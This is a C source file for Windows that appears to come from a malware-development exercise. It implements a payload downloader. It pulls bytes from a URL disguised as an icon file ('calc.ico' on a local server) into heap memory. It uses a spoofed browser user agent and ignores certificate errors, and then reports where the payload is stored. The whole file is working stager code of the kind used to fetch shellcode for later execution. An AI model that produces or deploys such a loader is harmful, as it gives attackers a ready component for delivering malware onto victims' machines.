#include "Windows.h"
#include "stdio.h"
#include "wininet.h"

#define HTTP_CHUNK_SIZE_BYTES 256
#define HTTP_USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"

void DownloadFromHttpUrl(IN PCHAR url, OUT LPVOID* pAddrPayload, OUT PDWORD pNumberOfBytesRead) {
	// Null outputs
	*pAddrPayload = NULL;
	*pNumberOfBytesRead = 0;

	// Open internet handle
	HINTERNET hInternet = InternetOpenA(HTTP_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("Failed to open handle to internet; error code: %d\n", GetLastError());
		return;
	}

	// Open handle to url
	HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_AUTH | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD, NULL);
	if (hUrl == NULL) {
		InternetCloseHandle(hInternet);
		printf("Failed to open handle to url; error code: %d\n", GetLastError());
		return;
	}

	// Fetch data from url in chunks
	HANDLE hHeap = GetProcessHeap();
	DWORD numberOfBytesReadChunk;
	LPVOID addrPayloadChunk = HeapAlloc(hHeap, NULL, HTTP_CHUNK_SIZE_BYTES);
	if (addrPayloadChunk == NULL) {
		InternetCloseHandle(hUrl);
		InternetCloseHandle(hInternet);
		printf("Failed to allocate memory in heap for temporary buffer; error code: %d\n", GetLastError());
		return;
	}
	while (InternetReadFile(hUrl, addrPayloadChunk, HTTP_CHUNK_SIZE_BYTES, &numberOfBytesReadChunk)) {
		// If read chunk is zero, reading is done
		if (numberOfBytesReadChunk == 0) {
			break;
		}

		// If read chunk is less than max chunk size, that means it's end of data. If it's equal, there might be more data to read.
		else if (numberOfBytesReadChunk <= HTTP_CHUNK_SIZE_BYTES) {
			// If payload buffer is null, it's first time for allocation
			if (*pAddrPayload == NULL) {
				// Allocate memory from heap
				*pAddrPayload = HeapAlloc(hHeap, NULL, numberOfBytesReadChunk);
				if (*pAddrPayload == NULL) {
					InternetCloseHandle(hUrl);
					InternetCloseHandle(hInternet);
					printf("Failed to allocate memory in heap for total buffer; error code: %d\n", GetLastError());
					return;
				}

				// Write fetched data to buffer
				memcpy_s(*pAddrPayload, numberOfBytesReadChunk, addrPayloadChunk, numberOfBytesReadChunk);
			}

			// If payload buffer is not null, buffer needs reallocation
			else {
				// Reallocate additional memory
				*pAddrPayload = HeapReAlloc(hHeap, NULL, *pAddrPayload, *pNumberOfBytesRead + numberOfBytesReadChunk);
				if (*pAddrPayload == NULL) {
					InternetCloseHandle(hUrl);
					InternetCloseHandle(hInternet);
					printf("Failed to reallocate memory in heap for total buffer; error code: %d\n", GetLastError());
					return;
				}

				// Write fetched data to buffer after the already stored data
				memcpy_s((DWORD64)(*pAddrPayload) + *pNumberOfBytesRead, numberOfBytesReadChunk, addrPayloadChunk, numberOfBytesReadChunk);
			}

			// Increment total number of bytes read
			*pNumberOfBytesRead += numberOfBytesReadChunk;

			// End if there's no more data to read
			if (numberOfBytesReadChunk < HTTP_CHUNK_SIZE_BYTES) {
				break;
			}
		}
	}

	// Cleanup
	HeapFree(hHeap, NULL, addrPayloadChunk);
	InternetCloseHandle(hUrl);
	InternetCloseHandle(hInternet);
	InternetSetOption(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0); // Required to close connection fully
}

void main() {
	CHAR url[] = "http://127.0.0.1:8080/calc.ico";
	DWORD numberOfBytesRead;
	DWORD64 addrPayload = NULL;

	DownloadFromHttpUrl(url, &addrPayload, &numberOfBytesRead);

	printf("%d bytes payload read, stored at 0x%p\n", numberOfBytesRead, (LPVOID)addrPayload);
}